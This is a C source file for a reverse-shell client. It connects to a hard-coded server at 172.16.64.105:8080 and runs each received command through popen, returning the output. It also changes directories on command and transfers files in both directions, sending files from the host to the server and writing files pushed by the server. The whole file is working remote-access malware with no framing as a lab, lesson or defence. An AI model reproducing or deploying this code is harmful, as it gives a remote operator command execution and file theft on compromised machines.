#include <stdio.h>
#include <stdlib.h> /* pour exit */
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h> /* pour memset */
#include <netinet/in.h> /* pour struct sockaddr_in */
#include <arpa/inet.h> /* pour htons et inet_aton */
#include <unistd.h>
#include <sys/stat.h>

#define BUFFER_SIZE 1024

uint64_t get_file_size(const char *filename) ;
int change_diroctory(char msg[256], char snd[256]);
int read_files(FILE *fp, char msg[256], int cs);
void send_outupte_of_command(char snd[256], FILE *fp, int cs, int size_snd) ;
int download_files(char msg[256], int cs, FILE *fp);

int main(){
    //creat socket
    int cs = socket(AF_INET, SOCK_STREAM, 0) ;
    if(cs < 0){
            // if socket is 1 socket creation failed
        printf("socket creation failed\n");
        exit(1);
    }
    printf("[+] socket created \n");
    // sockaddr_in creation and confugiration to connection with spicefie server
    struct sockaddr_in ska ;
    ska.sin_family = AF_INET ;
    ska.sin_port = htons(8080) ;
    inet_pton(AF_INET, "172.16.64.105", &ska.sin_addr);
    //connection with server
    int status = connect(cs, (struct sockaddr *)&ska, sizeof(ska)) ;
    if(status < 0){
        perror("error") ;
        exit(1) ;
    }
    char msg[256], snd[256] ;
    char fg[] = "1" ;
    FILE *fp ;
    // send and recv msg
    do{
        recv(cs, msg, sizeof(msg), 0) ;
        if(msg[0]=='c'&& msg[1]=='d'){
            if(change_diroctory(msg, snd) == 0){
                send(cs,snd, sizeof(snd), 0) ;
                send(cs, fg, sizeof(fg),0) ;
            }
        }else if(strncmp(msg, "download", 8) == 0){
            read_files(fp, msg, cs) ;
        }else if(strncmp(msg, "upload", 6)==0){
            if(download_files(msg, cs, fp)!= 0){
                printf("[-] failed to download file \n") ;
            }else{
                printf("[+] file Download with succefuly \n") ;
            }
        }else{
            fp = popen(msg, "r");
            printf("%s\n", msg) ;
            int size_snd = sizeof(snd) ;
            send_outupte_of_command(snd, fp, cs, size_snd);
            send(cs, fg, sizeof(fg),0) ;
        }
    } while(strcmp(msg, "exit")!=0);

    return 0 ;
}



//fonction for change directory
int change_diroctory(char msg[256], char snd[256]){
    for(int i=0; i<strlen(msg); i++){
        msg[i] = msg[i+3] ;
    }
    for(int i=0; i<=strlen("[+] changing directory"); i++){
        snd[i] = "[+] changing directory\n"[i] ;
    }
    return chdir(msg) ;
}

int read_files(FILE *fp, char msg[256], int cs){
    // remove download from command
    for(int i=0; i<strlen(msg); i++){
        msg[i] = msg[i+9] ;
    }
    //get size of the target file and send it
    uint64_t filesize = get_file_size(msg);
    uint64_t filesize_net = htobe64(filesize);
    send(cs, &filesize_net, sizeof(filesize_net), 0);
    char buffer[1024] ;
    fp = fopen(msg, "rb") ;
    int bytes ;
    while((bytes = fread(buffer,1, sizeof(buffer), fp))>0){
        send(cs, buffer, bytes, 0) ;
    }
    printf("[+] file send with succefuly to server...\n") ;
    return 0 ;
}

//send output of command
void send_outupte_of_command(char snd[256], FILE *fp, int cs, int size_snd){
    while(fgets(snd, size_snd, fp) != NULL){
        send(cs, snd, size_snd, 0) ;
    }
}

//get size of file
uint64_t get_file_size(const char *filename) {
    struct stat st;
    if (stat(filename, &st) != 0) return 0;
    return (uint64_t)st.st_size;
}


int download_files(char msg[256], int cs, FILE *fp){
    //remove upload from command
    char buffer[1024] ;
    for(int i=0; i<strlen(msg); i++){
        msg[i] = msg[i+7] ;
    }
    printf("%s\n", msg) ;

    //recv size of target file
    uint64_t filesize_net;
    recv(cs, &filesize_net, sizeof(filesize_net), MSG_WAITALL);
    uint64_t filesize = be64toh(filesize_net);
    printf("[+] File size: %lu bytes\n", filesize);
    //open new file to cute content of target file
    fp = fopen(msg, "wb");

    //verification
    if(fp == NULL){
        printf("[-]Failed to open file \n");
        return -1 ;
    }
    printf("[+] file opening succefuly...\n") ;
    size_t total=0 ;

    //read and write content and check if all data writed
    while(total<filesize){
        int to_read = (filesize - total) < BUFFER_SIZE ? (filesize - total) : BUFFER_SIZE;
        int bytes = recv(cs, buffer, to_read, 0) ;
        if (bytes <= 0)
            break;
        fwrite(buffer, 1, bytes, fp);
        total += bytes;
    }

    //colse the file and empty buffer variable
    fclose(fp) ;
    memset(buffer, 0, sizeof(buffer));
    return 0 ;
}
